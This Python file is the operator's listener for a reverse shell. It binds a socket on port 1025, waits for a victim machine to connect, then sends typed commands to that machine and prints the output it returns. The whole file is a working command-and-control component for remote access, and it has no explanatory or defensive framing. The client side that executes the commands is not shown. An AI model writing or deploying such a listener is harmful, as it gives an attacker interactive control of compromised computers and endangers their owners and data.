import socket
import sys

#Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 1025
        s = socket.socket()
    except socket.error as msg:
        print(f"Failed to create socket\n{msg}")

#binding a socket
def bind_socket():
    try:
        global host
        global port
        global s
        print(f"Binding socket using IP {host} on port {port}.\n")
        s.bind((host , port))
        s.listen(5)
        print(f"Listinig for connection on port {port}...\n")
    except socket.error as msg:
        print(f"Failed to bind socket {msg}.\n")

#accepting connections
def accept_socket():
    try:
        conn , address = s.accept()
        print(f"Established connection to {address[0]} on port {address[1]}.\n")
        send_commands(conn)
    finally:
        conn.close()
        s.close()
        sys.exit()

#creating a function to send commands.
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit' or cmd == 'exit':
            conn.send(str.encode(cmd , 'utf-8'))
            conn.close()
            s.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(str.encode(cmd , 'utf-8'))
            response = str(conn.recv(2048) , 'utf-8')
            print(response + '$ ', end = '')

def main():
    create_socket()
    bind_socket()
    accept_socket()

main()
